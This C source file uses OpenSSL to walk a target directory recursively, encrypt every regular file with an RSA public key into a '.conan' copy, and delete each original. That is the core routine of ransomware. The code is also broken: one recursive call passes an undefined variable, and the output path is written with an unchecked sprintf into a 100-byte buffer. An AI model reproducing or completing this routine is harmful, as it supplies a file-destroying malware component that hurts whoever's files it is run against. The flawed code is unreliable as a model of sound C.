#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/ec.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <stdio.h>  
#include <stdlib.h>   
#include <string.h>  
#include <dirent.h>  
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>


void handle_errors(const char *message)
{
    perror(message);
    ERR_print_errors_fp(stderr);
    exit(EXIT_FAILURE);
}

FILE *open_file(const char *file_path, const char *mode)
{
    FILE *file = fopen(file_path, mode);
    if (file == NULL)
    {
        handle_errors("Failed to open file");
    }
    return file;
}

RSA *read_public_key(const char *key_path)
{
    BIO *key_bio = BIO_new_file(key_path, "rb");
    RSA *rsa_key = PEM_read_bio_RSA_PUBKEY(key_bio, NULL, NULL, NULL);
    BIO_free(key_bio);
    if (rsa_key == NULL)
    {
        handle_errors("Failed to read public key");
    }
    return rsa_key;
}

void encrypt_file(const char *file_path, const char *key_path)
{
    char output_path[100];
    sprintf(output_path, "%s.conan", file_path);
    FILE *input_file = open_file(file_path, "rb");
    FILE *output_file = open_file(output_path, "wb");
    RSA *rsa_key_pub = read_public_key(key_path);

    int rsa_size = RSA_size(rsa_key_pub);
    int max_data_size = rsa_size - 42; // RSA_PKCS1_OAEP_PADDING overhead is 42 bytes

    unsigned char *cipher_txt = malloc(rsa_size);
    if (cipher_txt == NULL)
    {
        handle_errors("Failed to allocate memory for cipher text");
    }

    char *buffer = (char *)malloc(max_data_size);
    if (buffer == NULL)
    {
        handle_errors("Failed to allocate buffer");
    }

    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, max_data_size, input_file)) > 0)
    {
        int result = RSA_public_encrypt(
            bytes_read,              // ขนาดข้อมูลที่เข้ารหัส
            (unsigned char *)buffer, // ข้อมูล
            cipher_txt,              // buffer
            rsa_key_pub,             // key
            RSA_PKCS1_OAEP_PADDING   // เหี้ยไรไม่รู้
        );

        fwrite(cipher_txt, 1, result, output_file);
    }

    free(buffer);
    free(cipher_txt);
    RSA_free(rsa_key_pub);
    fclose(input_file);
    fclose(output_file);
    remove(file_path);
}

void traget_walk(const char *basePath)
{
    DIR *dir = opendir(basePath);
    struct dirent *ent;

    if (dir == NULL)
    {
        perror("opendir");
        return;
    }

    while ((ent = readdir(dir)) != NULL)
    {
        if (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0)
        {
            struct stat filestat;
            char fullpath[1024];
            long path_len = snprintf(fullpath, sizeof(fullpath), "%s/%s", basePath, ent->d_name);

            if (path_len >= sizeof(fullpath))
            {
                fprintf(stderr, "Path is too long: %s/%s\n", basePath, ent->d_name);
                continue;
            }

            if (stat(fullpath, &filestat) == -1)
            {
                perror("stat");
                continue;
            }

            printf("Encrypt -> %s\n", fullpath);

            if (S_ISREG(filestat.st_mode))
            {
       
                    encrypt_file(fullpath, "./key/public.pem");
            }
            else if (S_ISDIR(filestat.st_mode))
            {
                traget_walk(fullpath, category);
            }
        }
    }

    if (closedir(dir) == -1)
    {
        perror("closedir");
    }
}

int main()
{
    traget_walk("./traget");
    return 0;
}
